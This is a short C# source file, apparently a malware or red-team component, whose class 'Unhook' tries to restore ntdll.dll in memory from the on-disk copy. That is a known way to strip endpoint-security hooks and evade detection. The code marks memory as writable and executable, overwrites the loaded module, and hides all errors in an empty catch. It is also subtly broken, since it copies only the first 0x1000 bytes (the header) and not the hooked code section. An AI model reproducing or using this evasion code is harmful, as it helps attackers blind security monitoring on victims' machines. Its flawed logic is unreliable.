using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class Unhook
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void RestoreNtdll()
    {
        try
        {
            string systemDir = Environment.SystemDirectory;
            string ntdllPath = Path.Combine(systemDir, "ntdll.dll");

           
            byte[] diskNtdll = File.ReadAllBytes(ntdllPath);

        
            IntPtr ntdllBase = LoadLibrary("ntdll.dll");

            if (ntdllBase == IntPtr.Zero)
                return;

        
            uint oldProtect;
            VirtualProtect(ntdllBase, (UIntPtr)0x1000, 0x40, out oldProtect);

        
            Marshal.Copy(diskNtdll, 0, ntdllBase, 0x1000);

            VirtualProtect(ntdllBase, (UIntPtr)0x1000, oldProtect, out oldProtect);
        }
        catch
        {
           
        }
    }
}
